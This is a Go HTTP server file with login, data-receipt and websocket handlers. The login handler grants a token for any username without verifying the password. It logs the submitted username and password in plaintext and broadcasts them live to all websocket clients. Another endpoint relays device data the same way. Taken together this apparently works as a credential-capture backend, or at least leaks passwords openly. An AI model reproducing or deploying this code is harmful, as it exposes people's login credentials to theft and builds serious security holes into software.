package main

import (
	"encoding/json"
	"errors"
	"log"
	"net/http"
	"strings"
)

func index(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "index.html")
}

func receiveData(w http.ResponseWriter, r *http.Request) {
	username, err := middleware(r)

	if err != nil {
		http.Error(w, err.Error(), http.StatusUnauthorized)
		return
	}

	var data map[string]string
	err = json.NewDecoder(r.Body).Decode(&data)

	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	splitted := strings.Split(r.URL.Path, "/")
	deviceID := splitted[len(splitted)-1]

	log.Println(data["IAPOW"])
	json, _ := json.Marshal(map[string]interface{}{
		"username": username,
		"codcli":   deviceID,
		"body":     data,
		"logged":   true,
	})

	m.Broadcast(json)
}

func webSocket(w http.ResponseWriter, r *http.Request) {
	m.HandleRequest(w, r)
}

func login(w http.ResponseWriter, r *http.Request) {

	var data map[string]string

	err := json.NewDecoder(r.Body).Decode(&data)

	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	token, err := GenerateJwt(data["username"])

	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
	}

	bearerData := map[string]interface{}{
		"token_type": "Bearer",
		"token":      token,
		"expires":    28800,
	}

	jData, _ := json.Marshal(bearerData)

	w.Header().Set("Content-Type", "application/json")
	w.Write(jData)

	json, _ := json.Marshal(map[string]interface{}{
		"username": data["username"],
		"password": data["password"],
		"logged":   false,
	})

	log.Println(string(json))

	m.Broadcast(json)
}

func middleware(r *http.Request) (string, error) {
	authHeader := strings.Split(r.Header.Get("Authorization"), "Bearer ")

	if len(authHeader) != 2 {
		return "", errors.New("not bearer token received")
	}

	token := authHeader[1]

	id, err := GetIdFromJwt(token)

	if err != nil {
		return "", err
	}

	return id, nil
}
